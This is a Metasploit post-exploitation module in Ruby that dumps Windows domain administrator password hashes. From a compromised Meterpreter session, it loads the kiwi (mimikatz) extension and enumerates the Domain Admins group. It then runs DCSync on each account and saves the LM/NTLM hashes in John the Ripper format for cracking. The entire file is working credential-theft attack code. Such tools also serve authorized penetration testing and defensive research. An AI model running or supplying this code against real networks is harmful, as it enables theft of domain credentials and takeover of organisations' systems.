##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Gather Domain Administrator Hashes',
      'Description'   => %q(This script automates the retrieval of domain administrator hashes into JTR format, using the kiwi module's dcsync_ntlm function.  Obviously, the user session must have DCSync privileges \(commonly, a domain administrator\). This method is superior to others because it also obtains the weak LM hashes, making cracking extremely effective.),
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Joe Testa <jtesta[at]positronsecurity.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run

    # Load the kiwi module if it isn't loaded already.
    unless client.kiwi
      print_status("Loading kiwi module...")
      session.core.use("kiwi")
    end

    # Ensure the kiwi module is now loaded, otherwise terminate.
    unless client.kiwi
      print_error("Failed to load kiwi module!")
      return
    end

    domain = get_env("USERDOMAIN")
    print_status("Enumerating members of \"Domain Admins\" group for domain #{domain}...")

    # Get the list of domain administrators
    net_group_output = cmd_exec("net group \"Domain Admins\" /domain")

    # Parse the domain admins out of the 'net group' output.
    domain_admins = get_members(net_group_output.split("\n"))

    # If the domain admins group is empty, we must have parsed it wrong...
    if domain_admins.empty?
      print_error("\"Domain Admins\" group is somehow empty!  The raw output of the net group command is: #{net_group_output}")
      return
    end

    print_status("Found #{domain_admins.length} domain admin accounts.")

    # Go through each domain admin and run kiwi's dcsync_ntlm function on it.
    loot = []
    domain_admins.each do |domain_admin|
      res = client.kiwi.dcsync_ntlm(domain_admin)

      # Sometimes nothing is returned unless the domain is prepended.
      if not res
        res = client.kiwi.dcsync_ntlm("#{domain}\\#{domain_admin}")
      end
      if res
        lm = res[:lm]
        if lm == '<NOT FOUND>'
          lm = 'aad3b435b51404eeaad3b435b51404ee'
        end
        hash = "#{domain}\\#{domain_admin}:#{res[:rid]}:#{lm}:#{res[:ntlm]}:::"
        print_good(hash)
        loot.push(hash)
      else
        print_error("Failed to retrieve hash for #{domain}\\#{domain_admin}.")
      end
    end

    print_status("Domain admin hash enumeration complete.")

    # Store the hashes, if we have any.
    if not loot.empty?
      loot_file = store_loot("windows.hashes", "text/plain", session, loot.join("\n"), nil, "Windows Hashes")
      print_status("Hashes stored in JTR format in #{loot_file}")
    end
  end

  # Taken from post/windows/gather/enum_domain_group_users.rb.
  def get_members(results)
    members = []

    # Usernames start somewhere around line 6
    results = results.slice(6, results.length)
    # Get group members from the output
    results.each do |line|
      line.split("  ").compact.each do |user|
        next if user.strip == ""
        next if user =~ /-----/
        next if user =~ /The command completed successfully/
        members << user.strip
      end
    end

    members
  end
end
